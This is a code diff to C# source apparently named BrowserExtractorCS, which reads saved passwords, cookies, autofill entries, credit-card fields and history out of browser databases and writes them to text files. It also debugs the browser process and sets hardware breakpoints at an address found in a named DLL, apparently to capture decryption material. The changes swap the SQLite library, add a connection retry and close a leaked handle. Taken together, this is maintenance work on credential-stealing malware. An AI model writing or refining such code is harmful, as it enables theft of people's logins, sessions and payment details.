@@ -5,7 +5,7 @@ using System.IO;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
-using Microsoft.Data.Sqlite;
+using System.Data.SQLite;
 using Newtonsoft.Json.Linq;
 using System.Security.Cryptography;
 
@@ -719,10 +719,10 @@ namespace BrowserExtractorCS
             string tempPath = Path.Combine(Path.GetTempPath(), $"{tempPrefix}_{Guid.NewGuid()}");
             File.Copy(dbPath, tempPath);
 
-            using (var conn = new SqliteConnection($"Data Source={tempPath};Pooling=False"))
+            using (var conn = new SQLiteConnection($"Data Source={tempPath};Pooling=False"))
             {
-                conn.Open();
-                using (var cmd = new SqliteCommand("SELECT origin_url, username_value, password_value FROM logins", conn))
+                if (!OpenConnWithRetry(conn)) { SafeDelete(tempPath); return; }
+                using (var cmd = new SQLiteCommand("SELECT origin_url, username_value, password_value FROM logins", conn))
                 using (var reader = cmd.ExecuteReader())
                 using (var writer = new StreamWriter(Path.Combine(outputDir, "passwords.txt")))
                 {
@@ -743,9 +743,19 @@ namespace BrowserExtractorCS
             SafeDelete(tempPath);
         }
 
+        private static bool OpenConnWithRetry(SQLiteConnection conn)
+        {
+            for (int i = 0; i < 5; i++)
+            {
+                try { conn.Open(); return true; }
+                catch { System.Threading.Thread.Sleep(500); }
+            }
+            return false;
+        }
+
         private static void SafeDelete(string path)
         {
-            if (!File.Exists(path)) return;
+            if (string.IsNullOrEmpty(path) || !File.Exists(path)) return;
             for (int i = 0; i < 5; i++)
             {
                 try
@@ -769,10 +779,10 @@ namespace BrowserExtractorCS
             string tempPath = Path.Combine(Path.GetTempPath(), $"{tempPrefix}_{Guid.NewGuid()}");
             File.Copy(dbPath, tempPath);
 
-            using (var conn = new SqliteConnection($"Data Source={tempPath};Pooling=False"))
+            using (var conn = new SQLiteConnection($"Data Source={tempPath};Pooling=False"))
             {
-                conn.Open();
-                using (var cmd = new SqliteCommand("SELECT host_key, name, value, encrypted_value FROM cookies", conn))
+                if (!OpenConnWithRetry(conn)) { SafeDelete(tempPath); return; }
+                using (var cmd = new SQLiteCommand("SELECT host_key, name, value, encrypted_value FROM cookies", conn))
                 using (var reader = cmd.ExecuteReader())
                 using (var writer = new StreamWriter(Path.Combine(outputDir, "cookies.txt")))
                 {
@@ -804,14 +814,14 @@ namespace BrowserExtractorCS
             string tempPath = Path.Combine(Path.GetTempPath(), $"{tempPrefix}_{Guid.NewGuid()}");
             File.Copy(dbPath, tempPath);
 
-            using (var conn = new SqliteConnection($"Data Source={tempPath};Pooling=False"))
+            using (var conn = new SQLiteConnection($"Data Source={tempPath};Pooling=False"))
             {
-                conn.Open();
+                if (!OpenConnWithRetry(conn)) { SafeDelete(tempPath); return; }
                 using (var writer = new StreamWriter(Path.Combine(outputDir, "autofill.txt")))
                 {
                     // Form History
                     try {
-                        using (var cmd = new SqliteCommand("SELECT name, value FROM autofill", conn))
+                        using (var cmd = new SQLiteCommand("SELECT name, value FROM autofill", conn))
                         using (var reader = cmd.ExecuteReader())
                         {
                             while (reader.Read()) writer.WriteLine($"Form: {reader.GetString(0)} = {reader.GetString(1)}");
@@ -820,7 +830,7 @@ namespace BrowserExtractorCS
 
                     // Credit Cards
                     try {
-                        using (var cmd = new SqliteCommand("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards", conn))
+                        using (var cmd = new SQLiteCommand("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards", conn))
                         using (var reader = cmd.ExecuteReader())
                         {
                             while (reader.Read())
@@ -846,10 +856,10 @@ namespace BrowserExtractorCS
             string tempPath = Path.Combine(Path.GetTempPath(), $"{tempPrefix}_{Guid.NewGuid()}");
             File.Copy(dbPath, tempPath);
 
-            using (var conn = new SqliteConnection($"Data Source={tempPath};Pooling=False"))
+            using (var conn = new SQLiteConnection($"Data Source={tempPath};Pooling=False"))
             {
-                conn.Open();
-                using (var cmd = new SqliteCommand("SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 100", conn))
+                if (!OpenConnWithRetry(conn)) { SafeDelete(tempPath); return; }
+                using (var cmd = new SQLiteCommand("SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 100", conn))
                 using (var reader = cmd.ExecuteReader())
                 using (var writer = new StreamWriter(Path.Combine(outputDir, "history.txt")))
                 {
@@ -881,26 +891,32 @@ namespace BrowserExtractorCS
                 if (debugEvent.dwDebugEventCode == LOAD_DLL_DEBUG_EVENT)
                 {
                     LOAD_DLL_DEBUG_INFO loadDll = MemoryHelper.ByteArrayToStructure<LOAD_DLL_DEBUG_INFO>(debugEvent.u);
-                    StringBuilder pathBuilder = new StringBuilder(260);
-                    uint len = GetFinalPathNameByHandle(loadDll.hFile, pathBuilder, (uint)pathBuilder.Capacity, 0);
-                    if (len > 0)
+
+                    if (targetAddress == IntPtr.Zero)
                     {
-                        string path = pathBuilder.ToString();
-                        if (path.Contains(config.DllName))
+                        StringBuilder pathBuilder = new StringBuilder(260);
+                        uint len = GetFinalPathNameByHandle(loadDll.hFile, pathBuilder, (uint)pathBuilder.Capacity, 0);
+                        if (len > 0)
                         {
-                            Console.WriteLine($"Found {config.DllName} at {loadDll.lpBaseOfDll:X}");
-                            targetAddress = FindTargetAddress(hProcess, loadDll.lpBaseOfDll, config.Name);
-                            if (targetAddress != IntPtr.Zero)
+                            string path = pathBuilder.ToString();
+                            if (path.Contains(config.DllName))
                             {
-                                var threads = GetAllThreads(debugEvent.dwProcessId);
-                                Console.WriteLine($"Setting hardware breakpoints for {config.Name} on {threads.Count} threads");
-                                foreach (var threadId in threads)
+                                Console.WriteLine($"Found {config.DllName} at {loadDll.lpBaseOfDll:X}");
+                                targetAddress = FindTargetAddress(hProcess, loadDll.lpBaseOfDll, config.Name);
+                                if (targetAddress != IntPtr.Zero)
                                 {
-                                    SetHardwareBreakpoint(threadId, targetAddress);
+                                    var threads = GetAllThreads(debugEvent.dwProcessId);
+                                    Console.WriteLine($"Setting hardware breakpoints for {config.Name} on {threads.Count} threads");
+                                    foreach (var threadId in threads)
+                                    {
+                                        SetHardwareBreakpoint(threadId, targetAddress);
+                                    }
                                 }
                             }
                         }
                     }
+
+                    if (loadDll.hFile != IntPtr.Zero) CloseHandle(loadDll.hFile);
                 }
                 else if (debugEvent.dwDebugEventCode == CREATE_THREAD_DEBUG_EVENT)
                 {
